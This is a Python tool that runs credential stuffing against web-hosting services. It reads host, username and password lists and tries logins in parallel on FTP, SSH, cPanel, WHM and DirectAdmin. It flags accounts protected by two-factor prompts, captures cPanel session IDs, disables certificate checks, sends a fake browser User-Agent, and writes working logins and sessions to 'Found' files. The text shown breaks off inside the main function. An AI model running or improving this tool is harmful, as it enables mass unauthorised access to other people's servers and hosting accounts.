from __future__ import print_function
import ftplib
import paramiko
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import time
import argparse
import os
import json
import csv
import re
from datetime import datetime
import threading
import sys
import urllib3
import signal

# Disable SSL warnings for testing environments
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variables for logging
log_file = None
log_lock = threading.Lock()
shutdown_requested = False
results_data = []

# Enhanced statistics tracking with TFA and error counts
stats = {
    'ftp_success': 0, 'ftp_failed': 0, 'ftp_tfa': 0,
    'ssh_success': 0, 'ssh_failed': 0, 'ssh_tfa': 0,
    'cpanel_success': 0, 'cpanel_failed': 0, 'cpanel_tfa': 0,
    'whm_success': 0, 'whm_failed': 0, 'whm_tfa': 0,
    'directadmin_success': 0, 'directadmin_failed': 0, 'directadmin_tfa': 0,
    'total_tested': 0, 'errors': 0, 'timeouts': 0
}

def log_message(message, status="INFO", service=None):
    """Enhanced logging with service categorization and color coding"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    service_tag = f"[{service.upper()}]" if service else ""
    formatted_message = f"[{timestamp}] [{status}] {service_tag} {message}"
    
    # Color coding for console output
    color_codes = {
        'SUCCESS': '\033[92m',  # Green
        'FAILED': '\033[91m',   # Red
        'TFA': '\033[93m',      # Yellow
        'ERROR': '\033[91m',    # Red
        'INFO': '\033[94m',     # Blue
        'RESET': '\033[0m'      # Reset
    }
    
    color = color_codes.get(status, color_codes['RESET'])
    print(f"{color}{formatted_message}{color_codes['RESET']}")
    
    # Write to log file if specified
    if log_file:
        with log_lock:
            try:
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(formatted_message + '\n')
            except Exception as e:
                print(f"Error writing to log file: {e}")

def update_stats(service, result, result_type='success'):
    """Enhanced statistics updating with TFA support"""
    with log_lock:
        stats['total_tested'] += 1
        if result_type == 'tfa':
            stats[f'{service}_tfa'] += 1
        elif result:
            stats[f'{service}_success'] += 1
        else:
            stats[f'{service}_failed'] += 1

def parse_credentials(line):
    """Enhanced credential parsing with validation for inconsistent formats"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    try:
        # Handle cpsess token format: host|port|cpsess_token/path
        if 'cpsess' in line and '|' in line:
            parts = line.split('|', 2)
            if len(parts) == 3 and 'cpsess' in parts[2]:
                # This is a session token format, skip for now
                log_message(f"SKIPPED - Session token format: {line}", "INFO")
                return None
        
        # Handle malformed formats: host|port|username instead of host:port|username|pass
        if '|' in line:
            parts = line.split('|')
            if len(parts) == 3:
                # Standard format: host|user|pass or host:port|user|pass
                host, username, password = parts[0].strip(), parts[1].strip(), parts[2].strip()
            elif len(parts) == 4:
                # Malformed format: host|port|user|pass - fix it
                host_part, port_part, username, password = [p.strip() for p in parts]
                if port_part.isdigit():
                    host = f"{host_part}:{port_part}"
                else:
                    # Not a port, treat as username|pass|extra
                    host, username, password = host_part, port_part, username
            elif len(parts) == 2:
                # Format: host|user (no password) - use fakepassword2 as default
                host, username = parts[0].strip(), parts[1].strip()
                password = "fakepassword2"
                log_message(f"INFO - No password provided, using default: {line}", "INFO")
            else:
                log_message(f"Invalid credential format (too many parts): {line}", "ERROR")
                return None
        else:
            # Space-separated format: host user pass
            parts = line.split(None, 2)
            if len(parts) < 2:
                log_message(f"Invalid credential format: {line}", "ERROR")
                return None
            elif len(parts) == 2:
                # Format: host user (no password)
                host, username = parts[0].strip(), parts[1].strip()
                password = "fakepassword2"
                log_message(f"INFO - No password provided, using default: {line}", "INFO")
            else:
                host, username, password = parts[0].strip(), parts[1].strip(), parts[2].strip()
        
        # Handle fake passwords (common in datasets)
        if password.lower() in ['fakepassword', 'fakepassword2', 'fake', 'password']:
            log_message(f"INFO - Detected fake password, will test anyway: {host}|{username}|{password}", "INFO")
        
        # Validate inputs
        if not all([host, username]):
            log_message(f"Missing host or username: {line}", "ERROR")
            return None
        
        # Clean and validate hostname
        original_host = host
        host = clean_hostname(host)
        if not is_valid_hostname_relaxed(host):
            log_message(f"Invalid hostname after cleaning: {original_host} -> {host}", "ERROR")
            return None
        
        return host, username, password
    
    except Exception as e:
        log_message(f"Credential parsing error: {line} - {e}", "ERROR")
        return None

def clean_hostname(host):
    """Clean and normalize hostname"""
    # Remove any leading/trailing whitespace
    host = host.strip()
    
    # Remove protocol if present
    if host.startswith(('http://', 'https://')):
        host = host.split('://', 1)[1]
    
    # Handle malformed hostnames starting with dash
    if host.startswith('-'):
        # Try to fix common issues
        if host.startswith('--'):
            host = host[2:]  # Remove double dash
        elif host.startswith('-'):
            host = host[1:]  # Remove single dash
    
    # Remove any trailing slash or path
    if '/' in host:
        host = host.split('/')[0]
    
    # Remove any trailing slash
    host = host.rstrip('/')
    
    return host

def is_valid_hostname_relaxed(hostname):
    """Relaxed hostname validation for credential testing"""
    if not hostname:
        return False
    
    # Basic length check
    if len(hostname) > 253:
        return False
    
    # Split on colon to separate hostname from port
    host_part = hostname.split(':')[0] if ':' in hostname else hostname
    port_part = None
    
    if ':' in hostname:
        parts = hostname.rsplit(':', 1)
        if len(parts) == 2 and parts[1].isdigit():
            host_part = parts[0]
            port_part = int(parts[1])
            # Validate port range
            if port_part < 1 or port_part > 65535:
                return False
    
    # Check for invalid characters in hostname part (more permissive)
    import string
    allowed_chars = string.ascii_letters + string.digits + '.-'
    if not all(c in allowed_chars for c in host_part):
        return False
    
    # Must contain at least one dot (for domain) or be localhost-style
    if '.' not in host_part and host_part not in ['localhost']:
        return False
    
    # Check for consecutive dots
    if '..' in host_part:
        return False
    
    # Check each label in hostname
    if '.' in host_part:
        labels = host_part.split('.')
        for label in labels:
            if not label:  # Empty label
                return False
            if len(label) > 63:  # Label too long
                return False
    
    return True

def should_skip_host(hostname):
    """Check if hostname should be skipped to avoid wasting time"""
    if not hostname:
        return True
    
    # Skip obviously invalid hostnames
    invalid_patterns = [
        # Common invalid patterns found in lists
        hostname.startswith('--'),
        hostname.endswith('--'),
        hostname.count('-') > 10,  # Too many dashes
        len(hostname) < 4,  # Too short
        hostname.isdigit(),  # Only numbers
        hostname.count('.') > 10,  # Too many dots
        # Common placeholder patterns
        hostname in ['localhost', '127.0.0.1', '0.0.0.0'],
        'example.com' in hostname,
        'test.com' in hostname and len(hostname) < 15,
        # Skip non-ASCII hostnames that might cause issues
        not all(ord(c) < 128 for c in hostname),
        # Skip hostnames with obvious malformation
        '..' in hostname,
        hostname.startswith('.') or hostname.endswith('.'),
    ]
    
    return any(invalid_patterns)

def normalize_url(host, port):
    """Normalize URL with proper port handling"""
    # Clean hostname first
    host = clean_hostname(host)
    
    # Extract existing port if present
    existing_port = None
    if ':' in host:
        host_parts = host.rsplit(':', 1)
        if len(host_parts) == 2 and host_parts[1].isdigit():
            host = host_parts[0]
            existing_port = int(host_parts[1])
    
    # Use existing port if valid, otherwise use default
    if existing_port and existing_port in [2083, 2087, 2222]:
        final_port = existing_port
    else:
        final_port = port
    
    # Construct final URL
    url = f"https://{host}:{final_port}"
    return url

def prefilter_credentials(credentials_list):
    """Pre-filter credentials to remove obviously invalid ones"""
    valid_count = 0
    filtered_list = []
    
    for line in credentials_list:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
            
        # Quick parsing to extract hostname
        try:
            if '|' in line:
                host_part = line.split('|')[0].strip()
            else:
                host_part = line.split()[0].strip()
            
            # Clean hostname for checking
            cleaned_host = clean_hostname(host_part)
            
            # Skip if invalid
            if should_skip_host(cleaned_host):
                log_message(f"SKIPPED - Invalid hostname: {cleaned_host}", "INFO")
                continue
                
            filtered_list.append(line)
            valid_count += 1
            
        except Exception:
            continue  # Skip malformed lines
    
    log_message(f"Pre-filtering complete: {valid_count} valid credentials from {len(credentials_list)} total", "INFO")
    return filtered_list

def extract_session_id(response_text, url):
    """Extract session ID from cPanel/WHM responses with improved patterns"""
    # Look for cpsess pattern in response text or URL redirects (based on analysis insights)
    session_patterns = [
        r'cpsess(\d{8,})',  # More specific: at least 8 digits
        r'/cpsess(\d{8,})/',
        r'sessionID["\']:\s*["\']cpsess(\d+)["\']',
        r'session_id["\']:\s*["\']cpsess(\d+)["\']',
        r'cpsess(\d+)/frontend'  # Pattern from analysis showing cpsess+digits/frontend
    ]
    
    for pattern in session_patterns:
        match = re.search(pattern, response_text)
        if match:
            return f"cpsess{match.group(1)}"
    
    # Check in URL itself
    url_patterns = [
        r'cpsess(\d{8,})'
    ]
    
    for pattern in url_patterns:
        match = re.search(pattern, url)
        if match:
            return f"cpsess{match.group(1)}"
    
    return None

def detect_tfa_requirement(response_text, status_code):
    """Enhanced TFA detection based on analysis insights"""
    tfa_indicators = [
        'tfatoken',  # Direct from analysis
        'security code',
        'Enter the security code',  # Exact phrase from analysis
        'two-factor',
        'authentication code',
        'verification code',
        'Security Code Required',  # From analysis
        'Enter the security code for',  # Rumahweb pattern from analysis
        'cPanel Login Security'  # From analysis page title
    ]
    
    # Case-insensitive search for TFA indicators
    response_lower = response_text.lower()
    return any(indicator.lower() in response_lower for indicator in tfa_indicators)

def save_result(service, host, username, password, status, session_id=None, tfa_required=False):
    """Save successful result to appropriate output file and structured data"""
    result_data = {
        'timestamp': datetime.now().isoformat(),
        'service': service,
        'host': host,
        'username': username,
        'password': password,
        'status': status,
        'session_id': session_id,
        'tfa_required': tfa_required
    }
    
    # Add to results data for structured output
    with log_lock:
        results_data.append(result_data)
    
    # Save to traditional text files (backward compatibility)
    os.makedirs('output', exist_ok=True)
    
    output_files = {
        'ftp': 'output/FTPFound.txt',
        'ssh': 'output/SSFound.txt',
        'cpanel': 'output/CpanelFound.txt',
        'whm': 'output/WHMFound.txt',
        'directadmin': 'output/DirectAdminFound.txt'
    }
    
    if service in output_files:
        with open(output_files[service], 'a', encoding='utf-8') as f:
            line = f"{host}|{username}|{password}"
            if session_id:
                line += f"|session:{session_id}"
            if tfa_required:
                line += "|TFA_REQUIRED"
            f.write(line + '\n')

def setup_session(timeout=15, verify_ssl=False, max_retries=3):
    """Setup requests session with retry strategy and proper headers"""
    session = requests.Session()
    retry_strategy = Retry(
        total=max_retries,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    # Set realistic headers based on analysis
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    return session



def check_ftp(line, timeout=15):
    """Enhanced FTP checking with better error handling"""
    credentials = parse_credentials(line)
    if not credentials:
        return False
    
    host, username, password = credentials
    
    # Remove port from host if present (FTP uses default port 21)
    if ':' in host and not host.startswith('['):  # Not IPv6
        host = host.split(':')[0]
    
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, timeout=timeout)
        ftp.login(username, password)
        
        # Get welcome message for additional validation
        welcome = ftp.getwelcome()
        ftp.quit()
        
        log_message(f"SUCCESS - Host: {host} | User: {username} | Pass: {password} | Welcome: {welcome[:50]}...", "SUCCESS", "FTP")
        update_stats('ftp', True)
        save_result('ftp', host, username, password, 'success')
        return True
        
    except ftplib.error_perm as e:
        error_msg = str(e)
        if "530" in error_msg:  # Login incorrect
            log_message(f"FAILED - Host: {host} | User: {username} | Pass: {password} | Error: Authentication failed", "FAILED", "FTP")
        else:
            log_message(f"FAILED - Host: {host} | User: {username} | Pass: {password} | Error: {error_msg}", "FAILED", "FTP")
        update_stats('ftp', False)
        return False
        
    except (ftplib.error_temp, ConnectionRefusedError, OSError) as e:
        log_message(f"FAILED - Host: {host} | Error: Connection failed - {str(e)}", "FAILED", "FTP")
        update_stats('ftp', False)
        stats['errors'] += 1
        return False
        
    except Exception as e:
        log_message(f"FAILED - Host: {host} | User: {username} | Pass: {password} | Error: {str(e)}", "FAILED", "FTP")
        update_stats('ftp', False)
        stats['errors'] += 1
        return False

def check_ssh(line, timeout=15):
    """Enhanced SSH checking with detailed error categorization"""
    credentials = parse_credentials(line)
    if not credentials:
        return False
    
    host, username, password = credentials
    
    # Extract port if specified
    port = 22
    if ':' in host and not host.startswith('['):  # Not IPv6
        try:
            host, port_str = host.rsplit(':', 1)
            port = int(port_str)
        except ValueError:
            pass  # Keep default port
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        ssh.connect(
            host, 
            port=port, 
            username=username, 
            password=password, 
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False
        )
        
        # Execute a simple command to verify access
        stdin, stdout, stderr = ssh.exec_command('whoami')
        user_info = stdout.read().decode().strip()
        ssh.close()
        
        log_message(f"SUCCESS - Host: {host}:{port} | User: {username} | Pass: {password} | Remote User: {user_info}", "SUCCESS", "SSH")
        update_stats('ssh', True)
        save_result('ssh', f"{host}:{port}", username, password, 'success')
        return True
        
    except paramiko.AuthenticationException:
        log_message(f"FAILED - Host: {host}:{port} | User: {username} | Pass: {password} | Error: Authentication failed", "FAILED", "SSH")
        update_stats('ssh', False)
        return False
        
    except paramiko.SSHException as e:
        if "Error reading SSH protocol banner" in str(e):
            log_message(f"FAILED - Host: {host}:{port} | Error: Not an SSH server", "FAILED", "SSH")
        elif "Authentication failed" in str(e):
            log_message(f"FAILED - Host: {host}:{port} | User: {username} | Pass: {password} | Error: Authentication failed", "FAILED", "SSH")
        else:
            log_message(f"FAILED - Host: {host}:{port} | User: {username} | Pass: {password} | Error: SSH error - {str(e)}", "FAILED", "SSH")
        update_stats('ssh', False)
        return False
        
    except (ConnectionRefusedError, OSError) as e:
        log_message(f"FAILED - Host: {host}:{port} | Error: Connection failed - {str(e)}", "FAILED", "SSH")
        update_stats('ssh', False)
        stats['errors'] += 1
        return False
        
    except Exception as e:
        log_message(f"FAILED - Host: {host}:{port} | User: {username} | Pass: {password} | Error: {str(e)}", "FAILED", "SSH")
        update_stats('ssh', False)
        stats['errors'] += 1
        return False

def check_login(line, login_type, session=None, timeout=15, verify_ssl=False):
    """Enhanced cPanel/WHM checking with improved validation based on analysis insights"""
    credentials = parse_credentials(line)
    if not credentials:
        return False
    
    host, username, password = credentials
    original_host = host
    
    # Determine default port
    default_port = 2083 if login_type == 'cpanel' else 2087
    
    # Normalize URL with proper port handling
    try:
        base_url = normalize_url(host, default_port)
        login_url = base_url + '/login/?login_only=1'
    except Exception as e:
        log_message(f"URL_ERROR - Host: {host} | Error: Failed to construct URL - {str(e)}", "ERROR", login_type.upper())
        update_stats(login_type, False)
        stats['errors'] += 1
        return False
    
    try:
        # Prepare request data
        data = {
            'user': username,
            'pass': password
        }
        
        # Use provided session or create new one
        if session is None:
            session = setup_session(timeout, verify_ssl)
        
        # Make request with enhanced session
        response = session.post(
            login_url,
            data=data,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=True
        )
        
        response_text = response.text
        status_code = response.status_code
        
        # Check for TFA requirement first (based on analysis insights)
        if detect_tfa_requirement(response_text, status_code):
            session_id = extract_session_id(response_text, response.url)
            log_message(f"TFA REQUIRED - URL: {login_url} | User: {username} | Pass: {password} | Session: {session_id}", "TFA", login_type.upper())
            update_stats(login_type, True, 'tfa')
            save_result(login_type, original_host, username, password, 'tfa_required', session_id, True)
            return True
        
        # Enhanced success detection based on analysis insights
        success_indicators = [
            # Pattern 1: Session ID in URL redirect (primary success indicator from analysis)
            (status_code in [200, 302] and extract_session_id(response_text, response.url) is not None),
            # Pattern 2: Successful redirect to dashboard with session
            (status_code in [200, 302] and 'cpsess' in response.url and 'frontend' in response.url),
            # Pattern 3: JSON response with status and security_token
            (status_code == 200 and "status" in response_text and "security_token" in response_text),
            # Pattern 4: Dashboard page indicators from analysis
            (status_code == 200 and ("cPanel - " in response_text or "WHM - " in response_text)),
            # Pattern 5: Success page with index.html in URL
            (status_code == 200 and "index.html" in response.url and 'cpsess' in response.url),
            # Pattern 6: Specific success patterns from analysis
            (status_code == 200 and ("Tools" in response_text or "Espace Technique" in response_text) and 'cpsess' in response.url)
        ]
        
        if any(success_indicators):
            session_id = extract_session_id(response_text, response.url)
            log_message(f"SUCCESS - URL: {login_url} | User: {username} | Pass: {password} | Session: {session_id}", "SUCCESS", login_type.upper())
            update_stats(login_type, True)
            save_result(login_type, original_host, username, password, 'success', session_id)
            return True
        
        # Enhanced failure detection based on analysis patterns
        elif status_code == 401:
            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: 401 Unauthorized (Invalid credentials)", "FAILED", login_type.upper())
        elif "The login is invalid" in response_text:  # Exact error message from analysis
            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: Invalid login credentials", "FAILED", login_type.upper())
        elif "login is invalid" in response_text.lower():  # Case-insensitive variant
            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: Login invalid", "FAILED", login_type.upper())
        elif status_code >= 500:
            log_message(f"FAILED - URL: {login_url} | Error: Server error ({status_code})", "FAILED", login_type.upper())
            stats['errors'] += 1
        elif status_code == 403:
            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: 403 Forbidden (Access denied)", "FAILED", login_type.upper())
        else:
            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | HTTP: {status_code}", "FAILED", login_type.upper())
        
        update_stats(login_type, False)
        return False

    except requests.exceptions.ConnectTimeout:
        log_message(f"TIMEOUT - URL: {login_url} | Error: Connection timeout after {timeout}s", "FAILED", login_type.upper())
        update_stats(login_type, False)
        stats['timeouts'] += 1
        return False
        
    except requests.exceptions.ReadTimeout:
        log_message(f"TIMEOUT - URL: {login_url} | Error: Read timeout after {timeout}s", "FAILED", login_type.upper())
        update_stats(login_type, False)
        stats['timeouts'] += 1
        return False
        
    except requests.exceptions.Timeout:
        log_message(f"TIMEOUT - URL: {login_url} | Error: Request timeout after {timeout}s", "FAILED", login_type.upper())
        update_stats(login_type, False)
        stats['timeouts'] += 1
        return False
        
    except requests.exceptions.SSLError as e:
        error_detail = str(e)
        if "certificate verify failed" in error_detail:
            log_message(f"SSL_ERROR - URL: {login_url} | Error: SSL certificate verification failed", "FAILED", login_type.upper())
        elif "SSL: WRONG_VERSION_NUMBER" in error_detail:
            log_message(f"SSL_ERROR - URL: {login_url} | Error: SSL version mismatch (not HTTPS?)", "FAILED", login_type.upper())
        else:
            log_message(f"SSL_ERROR - URL: {login_url} | Error: SSL error - {error_detail[:100]}", "FAILED", login_type.upper())
        update_stats(login_type, False)
        stats['errors'] += 1
        return False
        
    except requests.exceptions.ConnectionError as e:
        error_detail = str(e)
        if "getaddrinfo failed" in error_detail or "Failed to resolve" in error_detail:
            log_message(f"DNS_ERROR - Host: {host} | Error: Hostname resolution failed", "FAILED", login_type.upper())
        elif "Connection refused" in error_detail:
            log_message(f"CONNECTION_ERROR - URL: {login_url} | Error: Connection refused (port closed)", "FAILED", login_type.upper())
        elif "Network is unreachable" in error_detail:
            log_message(f"NETWORK_ERROR - URL: {login_url} | Error: Network unreachable", "FAILED", login_type.upper())
        else:
            log_message(f"CONNECTION_ERROR - URL: {login_url} | Error: {error_detail[:100]}", "FAILED", login_type.upper())
        update_stats(login_type, False)
        stats['errors'] += 1
        return False

    except requests.exceptions.TooManyRedirects:
        log_message(f"REDIRECT_ERROR - URL: {login_url} | Error: Too many redirects", "FAILED", login_type.upper())
        update_stats(login_type, False)
        stats['errors'] += 1
        return False

    except requests.exceptions.RequestException as e:
        error_detail = str(e)
        log_message(f"REQUEST_ERROR - URL: {login_url} | Error: {error_detail[:100]}", "FAILED", login_type.upper())
        update_stats(login_type, False)
        stats['errors'] += 1
        return False
        
    except UnicodeDecodeError as e:
        log_message(f"ENCODING_ERROR - URL: {login_url} | Error: Response encoding issue", "FAILED", login_type.upper())
        update_stats(login_type, False)
        stats['errors'] += 1
        return False
        
    except Exception as e:
        error_detail = str(e)
        log_message(f"UNEXPECTED_ERROR - URL: {login_url} | User: {username} | Error: {error_detail[:100]}", "ERROR", login_type.upper())
        update_stats(login_type, False)
        stats['errors'] += 1
        return False

def check_directadmin(line, session=None, timeout=15, verify_ssl=False):
    """Enhanced DirectAdmin checking with improved API handling"""
    credentials = parse_credentials(line)
    if not credentials:
        return False
    
    host, username, password = credentials
    original_host = host
    
    # Normalize URL with proper port handling for DirectAdmin (port 2222)
    try:
        base_url = normalize_url(host, 2222)
    except Exception as e:
        log_message(f"URL_ERROR - Host: {host} | Error: Failed to construct URL - {str(e)}", "ERROR", "DIRECTADMIN")
        update_stats('directadmin', False)
        stats['errors'] += 1
        return False
    
    # Use provided session or create new one
    if session is None:
        session = setup_session(timeout, verify_ssl)
    
    # Try multiple API endpoints based on analysis
    api_endpoints = [
        '/CMD_LOGIN',
        '/api/login',
        '/login.php'
    ]
    
    for endpoint in api_endpoints:
        login_url = base_url + endpoint
        
        try:
            # Try different data formats
            data_formats = [
                # Form data
                {'username': username, 'password': password},
                # DirectAdmin specific
                {'user': username, 'pass': password},
                # Alternative format
                {'da_user': username, 'da_pass': password}
            ]
            
            for data in data_formats:
                response = session.post(
                    login_url,
                    data=data,
                    timeout=timeout,
                    verify=verify_ssl,
                    allow_redirects=True
                )
                
                status_code = response.status_code
                response_text = response.text
                
                # Check for success indicators
                success_indicators = [
                    (status_code == 200 and 'sessionID' in response_text),
                    (status_code == 200 and 'session_id' in response_text),
                    (status_code == 302 and 'session' in response.headers.get('Location', '')),
                    ('DirectAdmin' in response_text and 'error' not in response_text.lower()),
                    (status_code == 200 and 'CMD_LOGIN' in response_text and 'error' not in response_text.lower())
                ]
                
                if any(success_indicators):
                    # Extract session information
                    session_id = None
                    try:
                        if response.headers.get('content-type', '').startswith('application/json'):
                            json_data = response.json()
                            session_id = json_data.get('sessionID') or json_data.get('session_id')
                    except:
                        pass
                    
                    if not session_id:
                        session_match = re.search(r'sessionID["\']:\s*["\']([^"\']+)["\']', response_text)
                        if session_match:
                            session_id = session_match.group(1)
                    
                    log_message(f"SUCCESS - URL: {login_url} | User: {username} | Pass: {password} | Session: {session_id}", "SUCCESS", "DIRECTADMIN")
                    update_stats('directadmin', True)
                    save_result('directadmin', original_host, username, password, 'success', session_id)
                    return True
            
        except requests.exceptions.ConnectionError as e:
            if "getaddrinfo failed" in str(e) or "Failed to resolve" in str(e):
                log_message(f"DNS_ERROR - Host: {host} | Error: Hostname resolution failed", "FAILED", "DIRECTADMIN")
                update_stats('directadmin', False)
                stats['errors'] += 1
                return False
            continue  # Try next endpoint
        except requests.exceptions.RequestException:
            continue  # Try next endpoint
        except Exception:
            continue  # Try next endpoint
    
    # If all endpoints failed
    log_message(f"FAILED - Host: {host} | User: {username} | Pass: {password} | All endpoints failed", "FAILED", "DIRECTADMIN")
    update_stats('directadmin', False)
    return False


def save_structured_results(output_format, filename=None):
    """Save results in structured formats (JSON/CSV) with resumability support"""
    if not results_data:
        log_message("No results to save", "INFO")
        return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    if output_format.lower() == 'json':
        filename = filename or f'output/results_{timestamp}.json'
        os.makedirs('output', exist_ok=True)
        
        # Include detailed metadata for resumability
        output_data = {
            'metadata': {
                'version': '2.0',
                'timestamp': datetime.now().isoformat(),
                'total_tested': stats['total_tested'],
                'total_successful': sum(stats[f'{service}_success'] for service in ['ftp', 'ssh', 'cpanel', 'whm', 'directadmin']),
                'total_tfa_required': sum(stats[f'{service}_tfa'] for service in ['ftp', 'ssh', 'cpanel', 'whm', 'directadmin']),
                'statistics': stats,
                'resumable': True
            },
            'results': results_data
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(output_data, f, indent=2, ensure_ascii=False)
        
        log_message(f"Results saved to JSON: {filename} ({len(results_data)} entries)", "INFO")
        
    elif output_format.lower() == 'csv':
        filename = filename or f'output/results_{timestamp}.csv'
        os.makedirs('output', exist_ok=True)
        
        if results_data:
            # Add enhanced fields for CSV
            enhanced_data = []
            for result in results_data:
                enhanced_result = result.copy()
                enhanced_result['success_rate'] = 'Success' if result['status'] in ['success', 'tfa_required'] else 'Failed'
                enhanced_result['has_session'] = 'Yes' if result.get('session_id') else 'No'
                enhanced_data.append(enhanced_result)
            
            fieldnames = enhanced_data[0].keys()
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(enhanced_data)
        
        log_message(f"Results saved to CSV: {filename} ({len(results_data)} entries)", "INFO")

def load_previous_results(filename):
    """Load previous results for resume functionality"""
    if not os.path.exists(filename):
        return []
    
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            data = json.load(f)
            if isinstance(data, dict) and 'results' in data:
                return data['results']
            elif isinstance(data, list):
                return data
    except Exception as e:
        log_message(f"Error loading previous results: {e}", "ERROR")
    
    return []

def print_stats():
    """Enhanced statistics with TFA tracking and error metrics"""
    log_message("=" * 80, "INFO")
    log_message("ENHANCED STATISTICS SUMMARY", "INFO")
    log_message("=" * 80, "INFO")
    log_message(f"Total credentials tested: {stats['total_tested']}", "INFO")
    log_message(f"Errors encountered: {stats['errors']}", "INFO")
    log_message(f"Timeouts: {stats['timeouts']}", "INFO")
    log_message("", "INFO")
    
    services = ['ftp', 'ssh', 'cpanel', 'whm', 'directadmin']
    
    for service in services:
        success = stats[f'{service}_success']
        failed = stats[f'{service}_failed']
        tfa = stats[f'{service}_tfa']
        total = success + failed + tfa
        
        if total > 0:
            success_rate = (success / total) * 100
            log_message(f"{service.upper()} Results:", "INFO")
            log_message(f"  ✓ Successful: {success} ({success_rate:.1f}%)", "INFO")
            log_message(f"  ✗ Failed: {failed}", "INFO")
            log_message(f"  🔐 TFA Required: {tfa}", "INFO")
            log_message(f"  📊 Total: {total}", "INFO")
            log_message("", "INFO")
    
    # Calculate overall statistics
    total_success = sum(stats[f'{service}_success'] for service in services)
    total_tfa = sum(stats[f'{service}_tfa'] for service in services)
    total_valid = total_success + total_tfa
    
    if stats['total_tested'] > 0:
        overall_rate = (total_valid / stats['total_tested']) * 100
        log_message(f"Overall Valid Credentials: {total_valid}/{stats['total_tested']} ({overall_rate:.2f}%)", "INFO")
        log_message(f"Success Rate (including TFA): {overall_rate:.2f}%", "INFO")
    
    log_message("=" * 80, "INFO")

def signal_handler(signum, frame):
    """Handle graceful shutdown on Ctrl+C"""
    global shutdown_requested
    shutdown_requested = True
    log_message("Shutdown requested. Finishing current tasks...", "INFO")
    print_stats()
    sys.exit(0)

def main():
    """Enhanced main function with comprehensive argument handling"""
    global log_file
    
    # Set up signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    
    # Set up enhanced argument parser
    parser = argparse.ArgumentParser(
        description='Enhanced Multi-Service Credential Checker',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python cp.py -f credentials.txt --services ftp,ssh,cpanel
  python cp.py -f list.txt --log results.log --threads 50
  python cp.py -f creds.txt --output-format json --timeout 20
  python cp.py -f data.txt --services cpanel,whm --no-ssl-verify
        """
    )
    
    parser.add_argument('-f', '--file', type=str, help='Credential file to test')
    parser.add_argument('--services', type=str, default='ftp,ssh,cpanel,whm,directadmin',
                       help='Services to test (comma-separated): ftp,ssh,cpanel,whm,directadmin')
    parser.add_argument('--log', type=str, help='Log file to write results')
    parser.add_argument('--threads', type=int, default=50, help='Number of threads (default: 50, was 100)')
    parser.add_argument('--timeout', type=int, default=15, help='Timeout in seconds (default: 15)')
    parser.add_argument('--output-format', choices=['text', 'json', 'csv'], default='text',
                       help='Output format for results (default: text)')
    parser.add_argument('--output-file', type=str, help='Specific output filename for structured formats')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('--max-retries', type=int, default=3, help='Maximum retry attempts (default: 3)')
    parser.add_argument('--resume', type=str, help='Resume from specified line number in file')
    
    args = parser.parse_args()
    
    try:
        # Set up enhanced logging
        if args.log:
            log_file = args.log
            # Write comprehensive header to log file
            with open(log_file, 'w', encoding='utf-8') as f:
                f.write(f"=== ENHANCED CP CREDENTIAL CHECKER LOG ===\n")
                f.write(f"Version: 2.0 (Improved with Analysis Insights)\n")
                f.write(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Log File: {log_file}\n")
                f.write(f"Services: {args.services}\n")
                f.write(f"Threads: {args.threads}\n")
                f.write(f"Timeout: {args.timeout}s\n")
                f.write(f"SSL Verify: {not args.no_ssl_verify}\n")
                f.write("=" * 80 + "\n\n")
            
            log_message(f"Enhanced logging enabled - Results will be saved to: {log_file}", "INFO")
        
        # Get filename (backward compatibility)
        if args.file:
            filename = args.file
        else:
            filename = input("Give Me Your List?: ")
            
        log_message(f"Loading credential file: {filename}", "INFO")
        
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                list_data = [line.strip() for line in f.readlines() if line.strip() and not line.startswith('#')]
        except IOError as e:
            log_message(f"Failed to read file {filename}: {e}", "ERROR")
            return 1
        
        # Handle resume functionality
        start_line = 0
        if args.resume:
            try:
                start_line = int(args.resume) - 1
                list_data = list_data[start_line:]
                log_message(f"Resuming from line {args.resume}", "INFO")
            except ValueError:
                log_message(f"Invalid resume line number: {args.resume}", "ERROR")
                return 1
        
        log_message(f"Loaded {len(list_data)} credentials for testing", "INFO")
        
        # Pre-filter credentials to remove obviously invalid hostnames
        list_data = prefilter_credentials(list_data)
        
        if not list_data:
            log_message("No valid credentials found after filtering", "ERROR")
            return 1
        
